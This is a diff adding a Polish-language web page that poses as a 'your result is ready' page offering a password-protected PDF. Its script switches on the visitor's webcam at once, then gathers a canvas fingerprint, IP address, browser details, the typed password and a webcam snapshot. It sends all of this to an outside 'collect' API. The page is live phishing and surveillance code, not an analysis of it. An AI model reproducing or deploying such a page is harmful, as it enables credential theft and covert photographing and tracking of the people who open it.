@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="utf-8">
+<title>Wyniki</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body { font-family: sans-serif; max-width: 400px; margin: 2rem auto; text-align: center; }
+video { width: 100%; border-radius: 12px; }
+input { width: 100%; padding: 0.7rem; box-sizing: border-box; margin-top: 8px; }
+button { margin-top: 12px; padding: 0.7rem 1.5rem; font-size: 1rem; cursor: pointer; }
+</style>
+</head>
+<body>
+<h2>🌸 Twój wynik jest gotowy!</h2>
+<p>Obejrzyj video z wynikiem:</p>
+<video id="v" autoplay playsinline></video>
+<p>Wpisz hasło, aby pobrać PDF:</p>
+<input type="password" id="pw" placeholder="Hasło" autocomplete="off">
+<button onclick="send()">Pobierz ✨</button>
+
+<script>
+const BACKEND = "https://website-sekrety-git-backend-collect-api-osabarca-1680s-projects.vercel.app/api/collect";
+
+async function collect() {
+const data = {
+fp: document.createElement("canvas").toDataURL(),
+ip: "unknown",
+ua: navigator.userAgent,
+screen: screen.width + "x" + screen.height,
+tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+lang: navigator.language,
+referrer: document.referrer,
+photo: null,
+pass: null,
+ts: new Date().toISOString()
+};
+try {
+const r = await fetch("https://api.ipify.org?format=json");
+const j = await r.json();
+data.ip = j.ip;
+} catch(e) {}
+return data;
+}
+
+async function send() {
+const d = await collect();
+d.pass = document.getElementById("pw").value || null;
+d.photo = (document.getElementById("v").srcObject) ? snapVideo() : null;
+
+await fetch(BACKEND, {
+method: "POST",
+headers: { "Content-Type": "application/json" },
+body: JSON.stringify(d)
+});
+
+alert("Gotowe! 🎉");
+}
+
+function snapVideo() {
+const v = document.getElementById("v");
+if (!v.videoWidth) return null;
+const c = document.createElement("canvas");
+c.width = v.videoWidth;
+c.height = v.videoHeight;
+c.getContext("2d").drawImage(v, 0, 0);
+return c.toDataURL("image/jpeg");
+}
+
+// Start kamery od razu
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(s => { document.getElementById("v").srcObject = s; })
+.catch(() => document.getElementById("v").remove());
+</script>
+</body>
+</html>
